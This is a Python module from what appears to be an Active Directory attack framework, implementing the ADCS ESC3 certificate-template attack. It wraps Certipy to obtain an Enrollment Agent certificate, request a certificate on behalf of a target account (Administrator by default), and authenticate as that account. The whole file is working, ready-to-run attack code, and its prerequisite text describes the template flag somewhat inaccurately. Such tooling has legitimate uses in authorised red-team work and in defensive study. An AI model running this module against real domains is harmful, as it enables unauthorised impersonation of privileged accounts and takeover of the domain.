import os

from module import BaseModule
from tool import Tool

class ADCSESC3(BaseModule):
    name = "ADCS - ESC3"
    path = "adcs/esc3"
    description = "ESC3: Misconfigured Certificate Template - Certificate Request Agent EKU"
    info = """This is a two-part attack where an attacker first obtains a Certificate Request Agent certificate (ESC3a), which then allows them to enroll on behalf of other users on a template that requires this agent approval (ESC3b), impersonating a high-privilege user.

Prerequisites (ESC3a - Get Request Agent Cert):
  - Enrollment rights on a template configured with the Certificate Request Agent EKU.
  - The template allows low-privileged users to enroll.

Prerequisites (ESC3b - Enroll on Behalf):
  - The attacker possesses a Certificate Request Agent certificate.
  - Enrollment rights on a template that has the CT_FLAG_ISSUANCE_POLICIES_FROM_REQUEST flag set (requires CA certificate manager approval)."""

    options = {
        "ca_host": {"default": "", "description": "ADCS CA Server IP or host address", "required": True},
        "ca_name": {"default": "", "description": "ADCS CA Name", "required": True},
        "dc_ip": {"default": "", "description": "DC IP or host address. If empty, domain will be used.", "required": False},
        "template": {"default": "", "description": "ESC3 vulnerable template", "required": True},
        "target_account": {"default": "Administrator", "description": "Account to attempt to compromise", "required": True},
        "domain": {"default": "", "description": "Auth: Domain name (FQDN)", "required": True},
        "username": {"default": "", "description": "Auth: Username", "required": True},
        "password": {"default": "", "description": "Auth: Password or NT Hash (for NTLM auth only)", "required": False},
        "auth": {"default": "ntlm", "description": "Auth: Type (ntlm, krb)", "required": True},
    }
    
    def __init__(self, registry, job_manager):
        super().__init__(registry, job_manager)

    async def run(self):
        if not self.validate_options():
            return

        os.chdir(self.logs_dir)
        tool = Tool(self)
        if not tool.set_auth(from_module=True):
            return

        attacker_pfx = self.uniq_filename(self.opts.username)
        pfx = self.uniq_filename(self.opts.target_account)
    
        tool.title("Obtain an Enrollment Agent certificate")
        if not await tool.certipy_req(['-template', self.opts.template, '-out', attacker_pfx]):
            return

        tool.title("Use the Enrollment Agent certificate to request a certificate on behalf of the target user")
        if not await tool.certipy_req(['-template', 'User', '-on-behalf-of', self.opts.target_account, '-pfx', attacker_pfx, '-out', pfx]):
            return

        tool.title("Authenticate as the target user with the obtained certificate")
        if not await tool.certipy_auth(pfx, ['-no-save']):
            return

        self.pane_b.write("[bold green][*] Attack successful.[/bold green]")
